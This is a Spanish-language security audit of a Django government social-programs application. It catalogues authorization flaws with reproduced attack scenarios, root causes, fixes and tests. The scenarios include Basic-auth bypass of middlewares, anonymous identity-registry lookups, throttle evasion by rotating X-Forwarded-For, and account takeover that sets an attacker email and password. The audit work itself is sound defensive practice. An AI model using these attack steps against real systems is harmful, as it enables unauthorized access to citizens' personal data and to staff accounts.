# 4.1 Seguridad y autorización (SEC, G1-01/02, G1c)

Fichas completas del dominio. Convenciones de ficha, `V-STD` y `V-UI`: ver README §0.
Base verificada: `origin/development @ 917e583`. PoC: `poc/test_repro_seguridad.py` (salvo que se indique otro).

**Causa raíz transversal (verificada en V1).**
1. DRF sin defaults: `config/settings.py:404-413` no fija `DEFAULT_AUTHENTICATION_CLASSES` ni `DEFAULT_PERMISSION_CLASSES`. Rigen `Session + Basic` y `AllowAny`. Basic autentica **dentro** de la vista, después de los middlewares (portal, sesión única, clave provisoria), que ven un anónimo.
2. `puede()` sin programa: `requiere` y `CapacidadRequeridaMixin` (`core/rbac.py:675`, `:704`) llaman `puede_alguna` sin programa; con `programa=None` se suman las capacidades de **todos** los roles del usuario (`rbac.py:569-570`).
3. El `CATALOGO` no acota los módulos `becas_*` ni `programas` (`rbac.py:46-237`), así que `_modulo_asignable_en_programa` (`:417-426`) los ofrece en cualquier programa y `RolForm.clean` (`users/forms/roles.py:137-146`) los acepta.
4. Vistas de legajos y dashboard con solo `login_required` / `IsAuthenticated`, mientras las pantallas equivalentes exigen `ciudadano.*`.

| ID | Título | Sev. | Estado | Ola | Esf. | Avance 03-oct |
|---|---|---|---|---|---|---|
| SEC-01 | HTTP Basic en `/api/` saltea portal, sesión única y clave provisoria | CRÍTICA | CONF. test | 0 (hecho) / 2 (resto) | S | 🟡 |
| SEC-02 | `CiudadanoViewSet`: CRUD del padrón para cualquier autenticado | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-03 | Admin de usuarios de un programa toma cuentas de superusuarios, admins globales y multiprograma | CRÍTICA | CONF. test | 0 | M | ✅ |
| SEC-04 | Consulta RENAPER anónima con payload crudo y throttle evadible | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-05 | `activate`/`deactivate` de usuarios por API para cualquier autenticado | CRÍTICA | CONF. test | 0 | S | ✅ |
| SEC-06 | Capacidades `becas.*` otorgables en roles de otro programa | ALTA | CONF. test | 2 | M | ⬜ |
| SEC-07 | `programa.configurar` en un rol de programa habilita el wizard de todos | ALTA | CONF. test | 2 | S-M | ⬜ |
| SEC-08 | XSS almacenado por nombre de rol en todas las páginas | ALTA | CONF. test | 0 | S | ✅ |
| SEC-09 | `/media/` sin login en DEV (nginx); sin pertenencia en ECOM | ALTA (DEV) / MEDIA (ECOM) | CONF. test | 0 (etapa 1) / 2 (etapa 2) | S + M | 🟡 |
| SEC-10 | Adjuntos de ciudadano/legajo sin capacidad ni pertenencia | ALTA | CONF. test | 2 | S-M | ⬜ |
| SEC-11 | APIs JSON de legajos (riesgo, alertas, timeline) sin capacidad | ALTA | CONF. test | 2 | S | ⬜ |
| SEC-12 | Derivaciones por GET (CSRF) sin capacidad; inscripción por `is_staff` | ALTA | CONF. test | 2 | S | ⬜ |
| SEC-13 | Catálogo geográfico escribible por API | ALTA | CONF. test | 0 | S | ✅ |
| SEC-14 | APIs del dashboard: enumeración del padrón y alertas globales | ALTA | CONF. test | 0 | S | ✅ |
| SEC-29 | Registro del portal sobre cualquier legajo con solo el DNI | ALTA | CONF. test | 0 | S | 🟡 |
| G1-01 | Chat público crea legajos de cualquier DNI con nombre falso que llegan a SIIS | ALTA | CONF. lectura | 0 | S | 🟡 |
| G1-02 | Segundo oráculo RENAPER anónimo en `/conversaciones/consultar-renaper/` | ALTA | CONF. lectura | 0 | S | ✅ |
| SEC-15 | Uploads de F-00 y merenderos sin lista blanca ni tope | MEDIA | CONF. test | 2 | S | ⬜ |
| SEC-16 | `/api/users/` lista personal con DNI e `is_superuser` | MEDIA | CONF. test | 0 | (en SEC-05) | ✅ |
| SEC-17 | La API de usuarios/roles saltea reglas del ABM | MEDIA | CONF. test | 0 | (en SEC-05) | ✅ |
| SEC-18 | Alertas: cerrar cualquiera por id; CRÍTICAS globales a quien no tiene legajos | MEDIA | CONF. test | 2 | S | ⬜ |
| SEC-19 | XSS en `/legajos/alertas/debug/` y rutas de prueba publicadas | MEDIA | CONF. test | 0 | S | ✅ |
| SEC-20 | Inyección de fórmulas en CSV/XLSX (incluye export de ciudadanos) | MEDIA | CONF. lectura | 2 | S | ⬜ |
| SEC-21 | Cupo: el Coordinador Regional ve y muta casos de sus pares | MEDIA | CONF. lectura | 2 | S | ⬜ |
| SEC-22 | Reportes, XLSX y cupo ignoran RN-P13 | MEDIA | CONF. lectura | 2 | S-M | ⬜ |
| SEC-23 | App de campo: PATCH y adjuntos sobre casos resueltos | MEDIA | CONF. lectura | 2 | S | ⬜ |
| SEC-24 | La app se autovalida la identidad con `origen: personas` | MEDIA | CONF. lectura | 2 | M | ⬜ |
| SEC-25 | `consultar_persona_becas` sin throttle | MEDIA | CONF. lectura | 2 | S | ⬜ |
| SEC-26 | Login, admin, recupero, clave provisoria y token de campo sin límites ni rotación | MEDIA | CONF. test (parte) | 2 | M | ⬜ |
| SEC-27 | RENAPER con `verify=False` | MEDIA | CONF. lectura | 2 | S | ⬜ |
| G1c-04 | `/ws/alertas/` difunde fuera de alcance, sin Origin y sin revalidar | MEDIA | CONF. test | 2 | M | ⬜ |
| SEC-30 | Requisitos/subsegmentos/coordinadores validados solo contra el segmento (Regional) | BAJA | CONF. lectura (latente) | 2 | S | ⬜ |
| SEC-31 | Padrón .xlsx: límite solo sobre el comprimido (zip bomb) | BAJA | PLAUSIBLE | 2 | S | ⬜ |
| SEC-32 | Consulta RENAPER desde la admisión sin `ciudadano.*`, por GET | BAJA | CONF. lectura | 2 | S | ⬜ |
| SEC-33 | El mapa del caso manda GPS a OpenStreetMap en cada apertura | BAJA | CONF. lectura | 2 | S | ⬜ |
| SEC-34 | `EntregaMercaderiaCreateView` busca antes de autorizar | BAJA | CONF. lectura | 2 | S | ⬜ |
| SEC-35 | Cookies seguras y HSTS dependen de `ENVIRONMENT=prd`; inactividad solo en JS | BAJA | PLAUSIBLE | 2 | S | ⬜ |
| SEC-36 | `programa_list` sin capacidad; errores con `str(exc)` al usuario | BAJA | CONF. lectura | 2 | S | ⬜ |
| SEC-37 | Link público, paso 2: muestra nombre y fecha a partir de DNI + sexo | BAJA | CONF. (riesgo aceptado, Cambio 71) | 2 | S | ⬜ |
| G1c-10 | `/admin/` y `admin/doc/` montados en todos los entornos | BAJA | CONF. ajustado | 2 | S | ⬜ |
| G1c-16 | Payload crudo de RENAPER en sesión (24 h) y caché (10 min) | BAJA | CONF. lectura | 2 | S | ⬜ |
| R0-01 | `/conversaciones/<id>/evaluar/` acepta escritura anónima | BAJA (MINOR) | revisión Ola 0 | 0 | S | ✅ |
| R0-05 | `DEFAULT_THROTTLE_RATES["renaper"]` sin consumidor | BAJA (MINOR) | revisión Ola 0 | 2 (con SEC-25) | incluido en SEC-25 | ⬜ |
| R0b-04 | `retrieve` de `/api/legajos/ciudadanos/<pk>/` da 404 sin `?search=` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | S | ⬜ |
| R0b-05 | `CiudadanoViewSet` declara `ordering` sin `OrderingFilter`: pagina sin orden | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | incluido en R0b-04 | ⬜ |
| R0b-06 | `AlertasViewSet` sin capacidad decidida | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (con SEC-18) | incluido en SEC-18 | ⬜ |
| R0b-07 | `config/urls.py` monta `/media/` abierto con `DEBUG=True` antes del bloque `SERVE_MEDIA` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Media) | S | ⬜ |
| R0b-08 | Comentarios que todavía dicen que nginx sirve `/media/` | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Media) | incluido en R0b-07 | ⬜ |
| R0b-09 | `actividad_reciente` pide `ciudadano.sensible` pero muestra inscripciones y derivaciones sin alcance | BAJA (MINOR) | revisión Ola 0 (2ª tanda) | 2 (Legajos) | S | ⬜ |
| R0b-11 | Desplegar SEC-09 etapa 1 en icore-srv (`web` antes que `nginx`) | — (operativo, PM) | revisión Ola 0 (2ª tanda) | PM | — | ⬜ |

---

## CRÍTICA

### SEC-01 · HTTP Basic en `/api/` saltea la barrera portal/backoffice, la sesión única y la clave provisoria
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC01BasicAuthTests`, 2 tests) · **Origen:** A5-01, A3-02 (parte Basic) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** 🟡 Parcial en #509 (Cambio 100), 01-oct-2026 — hecho el punto 1: `DEFAULT_AUTHENTICATION_CLASSES = [SessionAuthentication]` y `DEFAULT_PERMISSION_CLASSES = [IsAuthenticated]`; Basic ya no autentica en `/api/` y el ciudadano con sesión cae en `PortalCiudadanoMiddleware`. Punto 2 hecho el 03-oct-2026 sobre toda la lista de la ficha: #536 (Cambio 109) crea `BackofficeAutenticado` en `core/api_permissions.py` (#541 le suma `is_active` y deja fail-closed al superusuario dentro de `Ciudadanos`); se aplica en `users` (#540, Cambio 113: solo queda `UsuarioActualView`), `legajos` (#542, Cambio 114: `CiudadanoViewSet`, `AlertasViewSet`, `HistorialContactoViewSet`, `VinculoFamiliarViewSet`), `core/api_views` (6 ViewSets) y las 5 vistas de `dashboard/api_views` (#541, Cambio 115). **Falta (verificado contra `719dc0a`):** vistas DRF del backoffice fuera de la lista de la ficha que siguen sin `BackofficeAutenticado`: las 4 de `conversaciones/api_views` (`@login_required` + default; se van con la fase 2 de G1-01), las 8 de `core/views/performance.py` (`IsPerformanceAdmin`/`IsAdminUser`; se van con OPS-10), `SpectacularAPIView`/`SwaggerView`/`RedocView` (`config/urls.py:55-57`, `login_required` + `AllowAny` de Spectacular) y las raíces de los `DefaultRouter` de `/api/legajos/` y `/api/core/`. Ninguna es explotable hoy (sesión solo por cookie → el middleware frena al ciudadano; las de performance piden `config.administrar`/`is_staff`), así que el resto pasa a la **Ola 2, PR 8** (2 h). La app de campo (`programas/api/views.py`, Token + `CampoBecasPermission`) no es backoffice y queda fuera. Operativo: H-08 con ECOM. Seguimiento: R0-04 (raíz `/api/becas/` con Token).
- **Ubicación:** `config/settings.py:404-413` (`REST_FRAMEWORK`); middlewares `core/middleware.py:81-95` (`PortalCiudadanoMiddleware`), `users/middleware.py:9-66` (sesión única y clave provisoria; exime `/api/` a propósito).
- **Escenario (reproducido):** (1) un anónimo se registra en `/portal/mi-perfil/registro/` con el DNI de un `Ciudadano` existente (SEC-29); (2) con sesión, `/api/users/users/` da 302; (3) con `Authorization: Basic <dni>:<clave>`: `/api/users/users/` → 200 (lista el personal), `/api/legajos/ciudadanos/` → 200 (padrón), `/api/buscar-ciudadanos/?q=301` → 200, POST `/api/core/provincias/` → 201; (4) un territorial (solo `becas.campo`, con el login web prohibido por `users/forms/auth.py:44-51`) recibe 200 en `/api/legajos/ciudadanos/` por Basic. nginx reenvía `Authorization` sin tocarlo.
- **Causa raíz:** causa transversal 1.
- **Propuesta:**
  1. En `config/settings.py`, dentro de `REST_FRAMEWORK`:
     ```python
     "DEFAULT_AUTHENTICATION_CLASSES": ["rest_framework.authentication.SessionAuthentication"],
     "DEFAULT_PERMISSION_CLASSES": ["rest_framework.permissions.IsAuthenticated"],
     ```
     No hace falta `TokenAuthentication` global: la app de campo ya lo declara en `programas/api/views.py:213`, `:258` y `:442`; `ObtainCampoToken` hereda `permission_classes = ()` de `ObtainAuthToken`, así que el login de la app sigue andando. **Verificado:** con este cambio, 114 tests (`test_becas_api`, `users.tests.test_api_rbac`, `legajos`, `dashboard` y el PoC) con 0 regresiones; solo los 2 PoC de SEC-01 pasan a 403.
  2. Defensa en profundidad (recomendada): `core/api_permissions.py` con `class BackofficeAutenticado(BasePermission)` → `request.user.is_authenticated and not rbac.es_ciudadano_portal(request.user)`, como primer elemento de `permission_classes` en `CiudadanoViewSet`, `AlertasViewSet`, `UserViewSet`, `GroupViewSet`, `ProfileViewSet`, los ViewSets de `core/api_views` y las 5 vistas de `dashboard/api_views` (las vistas con `permission_classes` explícitas **no heredan** el default). `RequiereCapacidad(*codigos)` **ya existe** en ese archivo (fábrica de permiso DRF que llama `rbac.puede_alguna`; hoy la usa `users/api_views`): reusarla en SEC-02/05/13/14, no redefinirla.
  3. Cerrar la puerta de entrada: SEC-29.
- **Tests a agregar:** `core/tests/test_api_auth.py`: `test_basic_auth_rechazada_en_api_backoffice` (`APIClient` con `HTTP_AUTHORIZATION="Basic …"` contra `/api/users/users/`, `/api/legajos/ciudadanos/`, `/api/buscar-ciudadanos/?q=123` → 401/403); `test_token_campo_sigue_funcionando` (POST `/api/becas/auth/token/` y `GET /api/becas/relevamientos/` con `Token` → 200); `test_ciudadano_portal_con_sesion_no_entra_a_api` (→ 302).
- **Verificación:** V-STD + `manage.py test programas.tests.test_becas_api users legajos dashboard core`. Confirmar con ECOM que ningún monitoreo usa Basic contra `/api/` (el healthcheck está en `/health/`, fuera de DRF).
- **Dependencias:** ninguna. Se combina con SEC-29 en el mismo PR de Ola 0.

### SEC-02 · `CiudadanoViewSet`: CRUD completo del padrón para cualquier autenticado
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC02CiudadanoApiTests`) · **Origen:** A5-02, A3-02; incluye V1-NEW-03 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #542 (Cambio 114), 03-oct-2026 — `CiudadanoViewSet` pasa a `ReadOnlyModelViewSet` con `[BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")]`, `SearchFilter` en `filter_backends` (cierra V1-NEW-03) y queryset vacío con menos de 3 caracteres de `?search=` (la API contesta búsquedas, no listados); el serializer oculta `telefono`, `email` y `domicilio` sin `ciudadano.sensible`; el buscador de «Agregar familiar» sube su umbral a 3 caracteres. Tests en `legajos/tests/test_api_ciudadanos_rbac.py` (10). Seguimientos: R0b-04 (`retrieve` da 404 sin `?search=`) y R0b-05 (sin `OrderingFilter`).
- **Ubicación:** `legajos/api_views/__init__.py:36-51`; serializer `legajos/serializers/__init__.py:10-32`.
- **Escenario (reproducido):** un usuario sin roles hace PATCH `{"dni": "99999999"}` → 200 y el DNI cambia; DELETE → 204 (cascada sobre alertas, inscripciones y derivaciones). Además (V1-NEW-03) `search_fields` está declarado pero `filter_backends = [DjangoFilterBackend]` no incluye `SearchFilter`: el `?search=` de «Agregar familiar» (`ciudadano_detail.html:1224`) se ignora y devuelve 10 ciudadanos cualesquiera.
- **Causa raíz:** `ModelViewSet` con solo `IsAuthenticated`; serializer que deja escribir dni, nacimiento, teléfono, email y domicilio.
- **Propuesta:** pasar a `viewsets.ReadOnlyModelViewSet` (único consumidor: el GET `?search=` de `ciudadano_detail.html:1224`); `permission_classes = [BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")]`; en `to_representation`, borrar `email`, `telefono` y `domicilio` salvo `puede(user, "ciudadano.sensible")`; `filter_backends = [DjangoFilterBackend, SearchFilter]` y en `get_queryset` `if len(search) < 3: return qs.none()`.
- **Tests a agregar:** `legajos/tests/test_api_ciudadanos_rbac.py`: `test_sin_capacidad_403` (GET), `test_patch_y_delete_405` (con `ciudadano.editar` también), `test_con_ciudadano_ver_200_sin_sensibles`, `test_search_filtra_por_texto`, `test_search_vacio_devuelve_vacio`.
- **Verificación:** V-STD + `manage.py test legajos`. Probar en navegador que el buscador de «Agregar familiar» filtra (o queda retirado si LEG-03 decide B).
- **Dependencias:** SEC-01 (helpers `BackofficeAutenticado`, `RequiereCapacidad`). Relacionado con LEG-03.

### SEC-03 · El admin de usuarios de un programa toma la cuenta de un superusuario, de un admin global o de un usuario de otro programa
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC03TomaSuperusuarioTests`; ampliación en `poc/test_repro_usuarios.py::G1b01ToggleCrossProgramTests`, 2 tests) · **Origen:** A5-03, G1b-01 · **Ola:** 0 · **Esfuerzo:** M · **Decisión:** D-03 (email de multiprograma)

**Resolución:** ✅ Resuelto en #539 (Cambio 110), 03-oct-2026, incluida la ampliación G1b-01 — `puede_gestionar_usuario` rechaza al superusuario, a quien tenga `CAPS_ADMINISTRACION` y a quien tenga un rol activo con `CAPS_ADMIN_PROGRAMA` de un programa que el operador no administra; el nuevo `puede_gestionar_credenciales` exige que **todos** los roles del target estén en `alcance_roles_ids(operador)` (default de D-03), y si no, `CustomUserChangeForm` deshabilita usuario, correo y clave, `_apply_user_data` los ignora y el toggle se rechaza con aviso. TC-67-04 reescrito; tests en `users/tests/test_usuarios_abm.py::Sec03TomaDeCuentasTests`. Operativo: P-04 en PRD (R0b-12). Seguimientos: R0b-01 (help_text invisible), R0b-02 (rol desactivado), R0b-03 (P-04 incompleto), R0b-10 (botones en el listado).
- **Ubicación:** `users/selectors/usuarios.py:87-112` (`puede_gestionar_usuario`: True si el target tiene **un** rol activo del programa del operador); `users/forms/__init__.py:399-480` y `:423-432` (`CustomUserChangeForm` expone username, email y password); `users/services/admin.py:58-68` (`_apply_user_data` hace `set_password` y cambia email); `users/views/admin.py:150` (`UserToggleActivoView`, mismo chequeo).
- **Escenario (reproducido):** (a) un usuario con `programa.usuario.administrar` (rol de Becas) edita a `root` (superusuario con un rol «Operador Becas») → email `atacante@evil.test`, `check_password("Pwn3d-Clave-2026") == True`, y el toggle lo deja inactivo. (b) (G2) el admin de usuarios de Dispositivos **desactiva** al admin de Becas que además tiene un rol operativo de Dispositivos, y le cambia clave y email: el usuario conserva su rol de Becas con credenciales del atacante.
- **Causa raíz:** el chequeo de alcance mira «algún rol del programa», no «todos los roles del target»; no excluye superusuarios, admins globales (`CAPS_ADMINISTRACION`) ni admins de otro programa (`CAPS_ADMIN_PROGRAMA`).
- **Propuesta:**
  1. En `puede_gestionar_usuario`, rama de admin de programa, antes del `return` final:
     ```python
     if target.is_superuser or rbac.puede_alguna(target, rbac.CAPS_ADMINISTRACION):
         return False
     ```
     Cubre `UserUpdateView.get_object` y `UserToggleActivoView.post`, que ya lo llaman.
  2. Para el operador **no global**: puede editar username/email/password y usar el toggle **solo si todos** los roles activos del target están en `alcance_roles_ids(operador)`. Si no: en `CustomUserChangeForm.__init__`, `self.fields[x].disabled = True` para `username`, `email` y `password`; en el servicio, ignorar esos campos del POST; y `UserToggleActivoView.post` → 403. Además excluir siempre a quien tenga `CAPS_ADMIN_PROGRAMA` de **otro** programa.
  3. Registrar en `requerimientos.md` el ajuste de TC-67-04 (`users/tests/test_usuarios_abm.py:317`): hoy decide que el admin de programa cambia el email de un usuario multiprograma (Becas + Vivienda). Con el default de D-03, deja de poder hacerlo.
- **Tests a agregar:** en `users/tests/test_usuarios_abm.py`: `test_admin_programa_no_edita_superusuario` (GET y POST → redirect; clave y email intactos), `test_admin_programa_no_desactiva_admin_global`, `test_admin_programa_no_cambia_clave_de_multiprograma`, `test_admin_programa_no_desactiva_usuario_con_rol_de_otro_programa` (el de G1b-01 invertido). TC-67-04 se ajusta según D-03.
- **Verificación:** V-STD + `manage.py test users`. Pre-chequeo P-04 (README §3).
- **Dependencias:** G1b-02 (el mismo admin puede autootorgarse capacidades; Ola 2).

### SEC-04 · Consulta RENAPER anónima con el payload crudo y un throttle que se evade por `X-Forwarded-For`
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC04RenaperAnonimoTests`) · **Origen:** A5-04, A3-01, A2-01, V1-NEW-04 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-04 (incidente)

**Resolución:** ✅ Resuelto en #509 (Cambio 100), 01-oct-2026 — se borraron la ruta `/api/legajos/renaper/consultar/`, la vista `consultar_renaper_api` y `RenaperRateThrottle`; `legajos/tests/test_renaper_api.py` quedó como test invertido. `/api/becas/renaper/consultar/` sigue intacto. Queda operativo (D-04): revisar los logs de 90 días (P-15). Seguimiento: la tasa `renaper` quedó sin consumidor (R0-05).
- **Ubicación:** ruta `legajos/urls/api.py:15` (`renaper/consultar/`); vista `legajos/api_views/__init__.py:96-133` (`@permission_classes([AllowAny])`, devuelve `"datos_api": resultado.get("datos_api")` = `datos` crudo de RENAPER, `consulta_renaper.py:489`); rama de error `:113-121` devuelve `fallecido` (oráculo de defunción).
- **Escenario (reproducido):** un anónimo recibe 200 con `datos_api.calle` (calle, número, piso, provincia). 40/40 pedidos con `X-Forwarded-For` rotado dan 200; sin rotar, 429 en el pedido 31. Sin `NUM_PROXIES`, DRF 3.16 usa el XFF completo como identidad (`throttling.py:40`) y nginx conserva el valor del cliente. RENAPER está vivo en PRD (Cambio 79).
- **Consumidores:** ninguno. La app móvil dejó de usar esta ruta el 28-jun-2026 (commit `16f9ed6`; la usó del 24 al 28-jun desde `8a5d412`). Hoy la build de ECOM (`ecom/main 765696a`) llama a **`POST /api/becas/renaper/consultar/`**, que es un alias autenticado de `consultar_persona_becas` en `programas/api_urls.py:22`, y `origin/main` (`a66c2d3`) a `/api/becas/personas/consultar/`. En el backend solo la llama su test.
- **Propuesta:**
  1. Borrar `path("renaper/consultar/", …)` de `legajos/urls/api.py:15`, la vista `consultar_renaper_api` y `RenaperRateThrottle` de `legajos/api_views/__init__.py`.
  2. **No tocar** `programas/api_urls.py:22` (`/api/becas/renaper/consultar/`): lo usa la app en producción.
  3. Reescribir `legajos/tests/test_renaper_api.py`: `reverse("renaper_consultar")` → `NoReverseMatch`, o POST a la ruta vieja → 404.
  4. La tasa `"renaper": "30/min"` de settings puede quedar para SEC-25. Para cualquier throttle DRF por IP que quede: `core/api_throttling.py` con `class IPClienteMixin: def get_ident(self, request): return ip_cliente(request)` (reusa `core/services/throttle.py`). **No** usar `NUM_PROXIES` (es distinto en DEV —1, nginx— y en ECOM —ingress—).
  5. Revisar access logs de nginx (icore) y del ingress (ECOM) de los últimos 90 días: `grep "/api/legajos/renaper/consultar/"` y contar por IP.
- **Tests a agregar:** `legajos/tests/test_renaper_api.py::test_renaper_legacy_no_existe` (404); `programas/tests/test_becas_api.py::test_personas_consultar_becas_sigue_autenticado` (anónimo → 401) y `::test_alias_renaper_becas_sigue_autenticado` (`/api/becas/renaper/consultar/` con token → 200, anónimo → 401).
- **Verificación:** V-STD + `manage.py test legajos programas.tests.test_becas_api`.
- **Dependencias:** ninguna. Junto con G1-02 (segundo oráculo) en el mismo PR: si se cierra solo este, queda abierto el otro.

### SEC-05 · `activate` y `deactivate` de usuarios por API para cualquier autenticado
**Severidad:** CRÍTICA · **Estado:** CONFIRMADO con test (`SEC05ActivateDeactivateTests`) · **Origen:** A5-05 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-05 (apagar la API de usuarios)

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con el default de D-05 — `/api/users/` queda solo con `GET /api/users/me/` (`UsuarioActualView`, `[BackofficeAutenticado]`); se retiraron `UserViewSet`, `GroupViewSet` y `ProfileViewSet` (con `activate`, `deactivate`, `change_password` y `groups/<id>/users`) y sus serializers de escritura; todo lo demás bajo `/api/users/` da 404. Sin consumidores (grep). `me` se mudó de `/api/users/users/me/` a `/api/users/me/`. Tests en `users/tests/test_api_rbac.py` (11, con las PoC de SEC-05/16/17 invertidas). Cierra también SEC-16 y SEC-17.
- **Ubicación:** `users/api_views/__init__.py:53-57` (`get_permissions()` devuelve `[IsAuthenticated()]` para toda acción fuera de CRUD y pisa el `permission_classes` de los `@action` en `:93` y `:102`).
- **Escenario (reproducido):** un usuario plano hace POST `deactivate` → 200 y la víctima queda inactiva. Encadenado con SEC-01, lo hace un ciudadano del portal.
- **Propuesta (default D-05):** borrar `UserViewSet`, `GroupViewSet` y `ProfileViewSet` de `users/api_urls.py` y dejar solo `me` (no hay consumidores: el ABM web cubre todo). Cierra también SEC-16 y SEC-17. **Alternativa si D-05 = conservar:**
  ```python
  def get_permissions(self):
      if self.action in ("create", "update", "partial_update", "destroy", "activate", "deactivate"):
          return [BackofficeAutenticado(), RequiereCapacidad("usuario.administrar")()]
      if self.action in ("me", "change_password"):
          return [BackofficeAutenticado()]
      return [BackofficeAutenticado(), RequiereCapacidad(*rbac.CAPS_ENTRADA_ABM_USUARIOS)()]
  ```
  y `activate` dentro de `transaction.atomic()` delegando en un `UsuariosAdminService.toggle_activo(operador, user)` extraído de `UserToggleActivoView` (ya hace `asegurar_admin_restante(programa=…)`).
- **Tests a agregar:** `users/tests/test_api_rbac.py`: `test_deactivate_sin_capacidad_403` y `test_activate_sin_capacidad_403` (con la API apagada: `test_api_users_solo_me` → `resolve("/api/users/users/")` 404 y `/api/users/me/` 200).
- **Verificación:** V-STD + `manage.py test users`.
- **Dependencias:** SEC-01.

## ALTA

### SEC-06 · Las capacidades `becas.*` se otorgan en roles de otro programa y los gates no las acotan
**Severidad:** ALTA · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC06BecasCrossProgramTests`) · **Origen:** A5-06; observación de A4 sobre los exports (refutada en su forma original, absorbida acá) · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-06
- **Ubicación:** `core/rbac.py:46-237` (catálogo sin `"programas"` en los módulos `becas_*`), `:417-426`; `users/forms/roles.py:137-146`; exports `programas/views/relevamientos.py:423`, `:462`, `:510` (`get_object_or_404(Convocatoria, pk=pk)` con `@requiere(CAP_REPORTES)`, `CAP_REPORTES = "becas.programa.administrar"` en `:57`); `ProgramaSiis` en `proceso_masivo.py:56`/`:101` y `configuracion.py:300`/`:615`; `RenaperPendientesListView.get_queryset` (`revision.py:443-469`).
- **Escenario (reproducido):** el admin de Dispositivos abre `/roles/crear/`, el árbol le ofrece `becas.programa.administrar`; crea el rol «Escalada» (Programa/Dispositivos) con `becas.programa.administrar` y `becas.programa.proceso_masivo` y se lo asigna. `puede(u, "becas.programa.administrar")` → True, `es_admin_becas(u)` → False. `GET /becas/convocatorias/<pk>/export/beneficiarios/` → 200 con DNI; `/becas/config/programas/<pk>/proceso-masivo/` → 200. Contraste: un Coordinador sin admin → 302 (la versión de A4 «un coordinador baja DNI cambiando el id» es **falsa**).
- **Causa raíz:** causas transversales 2 y 3.
- **Propuesta:**
  1. `core/rbac.py`: agregar `"programas": ("BECAS",),` a los módulos `becas_admin`, `becas_segmentos`, `becas_subsegmentos`, `becas_requisitos`, `becas_preguntas`, `becas_coordinadores`, `becas_convocatorias`, `becas_relevamientos`, `becas_revision`, `becas_cupo`, `becas_beneficiarios`, `becas_reportes` y `becas_campo` (y a `relevamientos` si el PM confirma que es solo de Becas; hoy solo lo usa un templatetag de ejemplo). Con eso `arbol_capacidades(solo_programa=True, programa=<no Becas>)` deja de ofrecerlas y `RolForm.clean` las descarta.
  2. Migración de datos `users/00XX_quitar_becas_de_roles_de_otros_programas`: quitar de `group.permissions` los codenames `becas_%` de todo Group con `meta.programa` no nulo y distinto de `codigo="BECAS"`. Antes de borrar, imprimir en la salida de la migración el listado (rol, capacidad). Correr antes en PRD la consulta P-02 (README §3).
  3. Exports (`convocatoria_export_*`): `get_object_or_404(convocatorias_visibles(request.user).select_related("segmento"), pk=pk)` y reemplazar `@requiere(CAP_REPORTES)` por `if not es_admin_becas(request.user): raise PermissionDenied`. En el mismo diff, `celda_segura` (SEC-20).
  4. `ProcesoMasivoView`, `proceso_masivo_lanzar` y `proceso_masivo_frenar`: `if not rbac.puede(request.user, CAP_PROCESO_MASIVO, programa=programa_becas(request.user)): raise PermissionDenied`.
  5. `RenaperPendientesListView.get_queryset`: sumar `relevamiento__convocatoria__in=convocatorias_visibles(user)`.
- **Tests a agregar:** `users/tests/test_roles_abm.py::test_admin_dispositivos_no_ve_ni_asigna_capacidades_becas` (GET sin el código en el árbol; POST con el código → el rol queda sin él); `programas/tests/test_convocatoria_export_alcance.py` (rol de otro programa con `becas.programa.administrar` inyectado → 403/404 en los 3 exports); `programas/tests/test_proceso_masivo.py::test_rechaza_capacidad_de_rol_de_otro_programa`; test de la migración (rol de Dispositivos con `becas_programa_administrar` → después no la tiene).
- **Verificación:** V-STD + `manage.py test users programas`.
- **Dependencias:** D-06 y P-02 antes de la migración. Mismo PR que SEC-20 para los exports.

### SEC-07 · `programa.configurar` tildada en un rol de programa habilita el wizard de **todos** los programas
**Severidad:** ALTA · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC07ProgramaConfigurarTests`) · **Origen:** A5-07; V1-NEW-02 (corrección de la propuesta de P1) · **Ola:** 2 · **Esfuerzo:** S-M · **Decisión:** D-07
- **Ubicación:** `core/rbac.py:46-55` (módulo `programas`, `alcance: programa`, sin lista `programas`); `configuracion/views/programas.py:90`, `:120`, `:146`, `:175`, `:246`, `:290`, `:319`, `:357`, `:429` (`@requiere("programa.configurar")` global) y `:67` (listado).
- **Escenario (reproducido):** el admin de roles de Becas se tilda `programa.configurar` y `GET /configuracion/programas/<Dispositivos>/editar/paso1/` → 200.
- **Lo que NO hay que hacer:** mover `programa.configurar` a un módulo global (propuesta de P1). `programas/services/dispositivos.py:13` y `:56` (`puede_configurar_dispositivos`) la evalúan **con programa DISPOSITIVOS**; globalizarla rompe ese alcance.
- **Propuesta:**
  1. `core/rbac.py`: `puede_sin_programa(user, codigo)` → True si es superusuario activo o si alguna fila de `_filas_de_capacidad(user)` tiene ese codename con `programa_del_rol is None`; y el decorador `requiere_sin_programa(codigo, redirect_to=None)`.
  2. `configuracion/views/programas.py`: alta del wizard, paso 1 nuevo y acciones sin `pk` → `@requiere_sin_programa("programa.configurar")`. Vistas con `pk` (editar pasos, cambiar estado): `programa = get_object_or_404(Programa, pk=pk)` y `if not (rbac.puede_sin_programa(u, "programa.configurar") or rbac.puede(u, "programa.configurar", programa=programa)): return _respuesta_sin_permiso(...)`. Listado (`:67`): `puede_editar` por fila con el mismo criterio.
  3. `users/forms/roles.py` (`RolForm.clean`, no global): quitar `programa.configurar` de `permitidas` salvo que el programa del rol sea DISPOSITIVOS (único consumidor con alcance).
